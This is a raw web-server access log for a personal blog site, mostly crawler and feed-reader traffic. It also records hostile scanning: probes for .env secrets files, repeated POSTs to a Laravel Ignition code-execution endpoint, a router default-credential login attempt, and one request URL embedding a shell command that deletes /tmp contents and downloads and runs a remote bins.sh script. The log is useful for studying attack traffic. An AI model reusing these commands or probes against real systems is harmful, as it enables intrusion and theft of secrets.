144.168.239.42 - - [29/Nov/2021:05:13:12 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
209.153.66.66 - - [29/Nov/2021:05:13:38 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Tiny Tiny RSS/21.11-831648e (https://tt-rss.org/)"
216.244.66.232 - - [29/Nov/2021:05:18:26 +0000] "GET /robots.txt HTTP/1.1" 301 240 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
132.145.39.16 - - [29/Nov/2021:05:23:48 +0000] "GET /.env HTTP/1.1" 301 234 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
132.145.39.16 - - [29/Nov/2021:05:24:06 +0000] "POST / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
66.249.79.16 - - [29/Nov/2021:05:39:15 +0000] "GET /robots.txt HTTP/1.1" 301 237 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.18 - - [29/Nov/2021:05:39:16 +0000] "GET /ads.txt HTTP/1.1" 301 234 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
45.79.148.82 - - [29/Nov/2021:05:41:17 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
176.9.25.107 - - [29/Nov/2021:05:57:56 +0000] "GET /robots.txt HTTP/1.1" 301 237 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
176.9.25.107 - - [29/Nov/2021:05:58:07 +0000] "GET /blog/2010/9/30/Building%20FS2_Open%20on%20OpenSolaris.html HTTP/1.1" 301 279 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
176.9.25.107 - - [29/Nov/2021:05:58:23 +0000] "GET /blog/2011/1/11/DeWalt%20DC9096%20Battery%20Pack%20Teardown.html HTTP/1.1" 301 282 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
176.9.25.107 - - [29/Nov/2021:05:58:36 +0000] "GET /blog/2011/1/21/Well%20this%20is%20interesting.html HTTP/1.1" 301 271 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
176.9.25.107 - - [29/Nov/2021:05:58:50 +0000] "GET /blog/2011/7/9/Building%20a%20Garmin%20Montana%20Motorcycle%20Mount.html HTTP/1.1" 301 288 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
23.183.81.250 - - [29/Nov/2021:06:02:25 +0000] "GET http://k19811.linel4.cym668.com/application/views/member/js/login.js HTTP/1.1" 301 277 "http://k19811.linel4.cym668.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36"
209.153.66.66 - - [29/Nov/2021:06:06:47 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Tiny Tiny RSS/21.11-831648e (https://tt-rss.org/)"
216.244.66.232 - - [29/Nov/2021:06:08:30 +0000] "GET /robots.txt HTTP/1.1" 301 240 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
107.189.14.136 - - [29/Nov/2021:06:34:01 +0000] "GET http://k19811.linel1.cym668.com/application/views/member/js/login.js HTTP/1.1" 301 277 "http://k19811.linel1.cym668.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36"
69.164.211.90 - - [29/Nov/2021:06:41:17 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
136.144.41.198 - - [29/Nov/2021:06:47:24 +0000] "GET /.env HTTP/1.1" 301 231 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:24 +0000] "GET /public/.env HTTP/1.1" 301 238 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:24 +0000] "GET /platform/.env HTTP/1.1" 301 240 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:24 +0000] "GET /stag/.env HTTP/1.1" 301 236 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:24 +0000] "POST / HTTP/1.1" 301 227 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:24 +0000] "GET /core/.env HTTP/1.1" 301 236 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:29 +0000] "GET /localhost/.env HTTP/1.1" 301 241 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:29 +0000] "GET /dev/.env HTTP/1.1" 301 235 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:30 +0000] "GET /api/.env HTTP/1.1" 301 235 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:30 +0000] "GET /staging/.env HTTP/1.1" 301 239 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:30 +0000] "GET /app/.env HTTP/1.1" 301 235 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:30 +0000] "GET /testing/.env HTTP/1.1" 301 239 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:33 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 253 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:34 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 253 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:34 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 253 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:35 +0000] "GET /production/.env HTTP/1.1" 301 242 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:35 +0000] "GET /prod/.env HTTP/1.1" 301 236 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:35 +0000] "GET /locally/.env HTTP/1.1" 301 239 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:35 +0000] "GET /development/.env HTTP/1.1" 301 243 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:35 +0000] "GET /test/.env HTTP/1.1" 301 236 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:35 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 253 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:35 +0000] "GET /developer/.env HTTP/1.1" 301 241 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:35 +0000] "GET /development/.env HTTP/1.1" 301 244 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:35 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 253 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:35 +0000] "GET /localhost/.env HTTP/1.1" 301 242 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:35 +0000] "GET /.env HTTP/1.1" 301 232 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:35 +0000] "GET /test/.env HTTP/1.1" 301 237 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:35 +0000] "GET /api/.env HTTP/1.1" 301 236 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:35 +0000] "GET /core/.env HTTP/1.1" 301 237 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:35 +0000] "GET /public/.env HTTP/1.1" 301 239 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:35 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 253 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:36 +0000] "GET /ccaef.php HTTP/1.1" 301 236 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:36 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 253 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:37 +0000] "GET /app/.env HTTP/1.1" 301 236 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:37 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 253 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:37 +0000] "GET /production/.env HTTP/1.1" 301 243 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:37 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 254 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:37 +0000] "GET /stag/.env HTTP/1.1" 301 237 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:37 +0000] "GET /testing/.env HTTP/1.1" 301 240 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:37 +0000] "GET /prod/.env HTTP/1.1" 301 237 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:37 +0000] "GET /staging/.env HTTP/1.1" 301 240 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:37 +0000] "GET /platform/.env HTTP/1.1" 301 241 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:37 +0000] "POST / HTTP/1.1" 301 228 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:37 +0000] "GET /locally/.env HTTP/1.1" 301 240 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:37 +0000] "GET /developer/.env HTTP/1.1" 301 242 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:37 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 254 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:37 +0000] "GET /dev/.env HTTP/1.1" 301 236 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:37 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 253 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:38 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 253 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:38 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 254 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:38 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 253 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:39 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 254 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:39 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 253 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:39 +0000] "GET /ccaef.php HTTP/1.1" 301 236 "-" "Python/3.8 aiohttp/3.8.1"
127.0.0.1 - - [29/Nov/2021:06:47:40 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips (internal dummy connection)"
136.144.41.198 - - [29/Nov/2021:06:47:41 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 253 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:43 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 254 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:43 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 254 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:44 +0000] "GET /ccaef.php HTTP/1.1" 301 237 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:44 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 254 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:44 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 254 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:45 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 254 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:45 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 254 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:45 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 253 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:46 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 253 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:46 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 254 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:46 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 253 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:46 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 254 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:47 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 253 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:47 +0000] "GET /ccaef.php HTTP/1.1" 301 237 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:47 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 254 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:47 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 253 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:48 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 254 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:48 +0000] "GET /ccaef.php HTTP/1.1" 301 236 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:48 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 254 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:48 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 254 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:49 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 253 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:49 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 253 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:49 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 254 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:49 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 254 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:50 +0000] "GET /ccaef.php HTTP/1.1" 301 237 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:50 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 253 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:50 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 254 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:50 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 253 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:50 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 254 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:51 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 254 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:51 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 253 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:51 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 254 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:51 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 253 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:52 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 254 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:52 +0000] "GET /ccaef.php HTTP/1.1" 301 236 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:52 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 254 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:52 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 253 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:52 +0000] "GET /ccaef.php HTTP/1.1" 301 237 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:52 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 253 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:53 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 253 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:53 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 254 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:53 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 254 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:53 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 253 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:53 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 254 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:54 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 253 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:54 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 253 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:55 +0000] "GET /ccaef.txt HTTP/1.1" 301 236 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:55 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 254 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:55 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 253 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:55 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 254 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:55 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 253 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:55 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 254 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:56 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 253 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:56 +0000] "GET /ccaef.txt HTTP/1.1" 301 237 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:57 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 254 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:57 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 253 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:57 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 254 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:57 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 254 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:58 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 254 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:58 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 253 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:58 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 254 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:59 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 254 "-" "Python/3.8 aiohttp/3.8.1"
136.144.41.198 - - [29/Nov/2021:06:47:59 +0000] "GET /ccaef.txt HTTP/1.1" 301 237 "-" "Python/3.8 aiohttp/3.8.1"
127.0.0.1 - - [29/Nov/2021:06:47:59 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips (internal dummy connection)"
136.144.41.198 - - [29/Nov/2021:06:48:00 +0000] "POST /_ignition/execute-solution HTTP/1.1" 301 253 "-" "Python/3.8 aiohttp/3.8.1"
127.0.0.1 - - [29/Nov/2021:06:48:00 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips (internal dummy connection)"
136.144.41.198 - - [29/Nov/2021:06:48:02 +0000] "GET /ccaef.txt HTTP/1.1" 301 236 "-" "Python/3.8 aiohttp/3.8.1"
127.0.0.1 - - [29/Nov/2021:06:48:02 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips (internal dummy connection)"
127.0.0.1 - - [29/Nov/2021:06:48:03 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips (internal dummy connection)"
216.244.66.232 - - [29/Nov/2021:06:55:56 +0000] "GET /robots.txt HTTP/1.1" 301 240 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
186.233.73.56 - - [29/Nov/2021:06:59:01 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ http://2.56.59.64/bins.sh;chmod+777+/tmp/bins.sh;sh+/tmp/bins.sh" 400 226 "-" "-"
209.153.66.66 - - [29/Nov/2021:07:02:32 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Tiny Tiny RSS/21.11-831648e (https://tt-rss.org/)"
23.183.81.22 - - [29/Nov/2021:07:15:53 +0000] "GET https://ball365.vip/ HTTP/1.1" 301 228 "https://ball365.vip" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36"
123.6.49.36 - - [29/Nov/2021:07:23:09 +0000] "GET / HTTP/1.1" 301 227 "http://rsaxvc.net/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
1.192.195.5 - - [29/Nov/2021:07:23:11 +0000] "GET / HTTP/1.1" 301 227 "http://rsaxvc.net/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"
157.245.70.127 - - [29/Nov/2021:07:36:29 +0000] "GET /ab2g HTTP/1.1" 400 226 "-" "-"
157.245.70.127 - - [29/Nov/2021:07:36:29 +0000] "GET /ab2h HTTP/1.1" 400 226 "-" "-"
66.249.79.14 - - [29/Nov/2021:07:38:45 +0000] "GET /datasheets/hammerspace/7038544-Andover-Infinity-Programmers-Guide.pdf HTTP/1.1" 301 296 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.164.211.90 - - [29/Nov/2021:07:41:19 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
216.244.66.232 - - [29/Nov/2021:07:45:00 +0000] "GET /robots.txt HTTP/1.1" 301 240 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
123.125.109.54 - - [29/Nov/2021:07:48:44 +0000] "GET / HTTP/1.1" 301 227 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
209.153.66.66 - - [29/Nov/2021:07:49:41 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Tiny Tiny RSS/21.11-831648e (https://tt-rss.org/)"
60.250.54.70 - - [29/Nov/2021:08:04:21 +0000] "GET /datasheets/st/3303.pdf HTTP/1.1" 301 249 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
60.250.54.70 - - [29/Nov/2021:08:05:12 +0000] "-" 408 - "-" "-"
60.250.54.70 - - [29/Nov/2021:08:05:13 +0000] "-" 408 - "-" "-"
66.249.93.246 - - [29/Nov/2021:08:22:03 +0000] "GET / HTTP/1.1" 301 227 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
109.239.58.107 - - [29/Nov/2021:08:36:32 +0000] "GET / HTTP/1.1" 301 228 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 Edg/91.0.864.54"
209.153.66.66 - - [29/Nov/2021:08:40:21 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Tiny Tiny RSS/21.11-831648e (https://tt-rss.org/)"
97.107.141.188 - - [29/Nov/2021:08:41:17 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
64.62.197.92 - - [29/Nov/2021:08:42:29 +0000] "GET / HTTP/1.1" 301 230 "-" "-"
39.130.62.61 - - [29/Nov/2021:08:45:19 +0000] "GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0" 301 285 "-" "-"
54.160.215.87 - - [29/Nov/2021:08:52:37 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (Windows NT 6.2;en-US) AppleWebKit/537.32.36 (KHTML, live Gecko) Chrome/50.0.3069.110 Safari/537.32"
123.183.224.160 - - [29/Nov/2021:09:16:09 +0000] "GET /blog/css/blog.css HTTP/1.1" 301 244 "http://rsaxvc.net/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
123.183.224.153 - - [29/Nov/2021:09:16:13 +0000] "GET /blog/css/blog.css HTTP/1.1" 301 244 "http://rsaxvc.net/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
